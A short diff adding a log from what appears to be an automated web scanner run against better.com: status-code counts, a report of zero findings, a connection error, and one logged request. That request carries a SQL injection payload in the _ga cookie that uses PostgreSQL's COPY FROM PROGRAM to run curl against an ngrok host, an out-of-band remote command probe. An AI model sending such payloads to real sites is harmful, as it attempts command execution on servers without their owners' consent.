@@ -1,0 +1,12 @@
+
+all the statuses
+
+1: 304
+3: 200
+2: 404
+3: 403
+found 0 vulnerability
+
+error in:
+('https://better.com/_next/static/css/dc144860e597d2f9c281.css.map', ConnectionError(ProtocolError('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))))
+status: 502 | url: https://better.com/ | parameter _ga | payload: "qhjhjk'||((CHR(115)||CHR(83)||CHR(73)||CHR(105)) WHERE 6252=6252 OR 4149=(4149 FROM COPY trigger_test (command_output) FROM PROGRAM 'curl http://eebfc2622bb2.ngrok.io/';))||'" | method: get | where: cookie
